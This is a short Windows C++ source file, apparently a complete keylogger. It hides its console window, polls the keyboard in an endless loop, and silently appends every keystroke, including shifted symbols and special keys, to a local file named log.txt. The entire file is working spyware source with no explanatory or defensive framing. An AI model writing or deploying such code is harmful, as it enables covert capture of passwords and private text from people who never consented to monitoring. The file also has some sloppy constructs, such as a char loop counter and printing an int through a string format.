#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);

int main(){
    FreeConsole();
    char i;
    while(true){
        Sleep(10);
        for (i=8;i<=255;i++){
            if (GetAsyncKeyState(i) == -32767){
                Save(i,"log.txt");
            }
        }
    }
    return 0;
}

int Save(int _key, char *file){
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    Sleep(10);
    if (_key == VK_SHIFT){
        fprintf(OUTPUT_FILE, "%s", "");
    }
    else if (_key == VK_BACK){
        fprintf(OUTPUT_FILE, "%s", "[DEL]");
    }
    else if (_key == VK_LBUTTON){
        fprintf(OUTPUT_FILE, "%s", "[LC]");
    }
    else if (_key == VK_RETURN){
        fprintf(OUTPUT_FILE, "%s", "[ENT]");
    }
    else if (_key == VK_ESCAPE){
        fprintf(OUTPUT_FILE, "%s", "[ESC]");
    }
    else if (_key == VK_CAPITAL){
        fprintf(OUTPUT_FILE, "%s", "[CAPS]");
    }
    else{
        if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 and _key>=60 and _key<=90 and (GetAsyncKeyState(VK_SHIFT) & 0x8000) == 0)
            _key += 32;
        if (_key == 46){
            fprintf(OUTPUT_FILE, "%s", ".");
        }
        else if (_key == 44){
            fprintf(OUTPUT_FILE, "%s", ",");
        }
        else{
            if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0){
                if (_key == 48)fprintf(OUTPUT_FILE, "%s", ")");
                else if (_key == 49)fprintf(OUTPUT_FILE, "%s", "!");
                else if (_key == 50)fprintf(OUTPUT_FILE, "%s", "@");
                else if (_key == 51)fprintf(OUTPUT_FILE, "%s", "#");
                else if (_key == 52)fprintf(OUTPUT_FILE, "%s", "$");
                else if (_key == 53)fprintf(OUTPUT_FILE, "%s", "%");
                else if (_key == 54)fprintf(OUTPUT_FILE, "%s", "^");
                else if (_key == 55)fprintf(OUTPUT_FILE, "%s", "&");
                else if (_key == 56)fprintf(OUTPUT_FILE, "%s", "*");
                else if (_key == 57)fprintf(OUTPUT_FILE, "%s", "(");
                else fprintf(OUTPUT_FILE, "%s", &_key);
            }
            else fprintf(OUTPUT_FILE, "%s", &_key);
        }
    }
    fclose(OUTPUT_FILE);
    return 0;
}
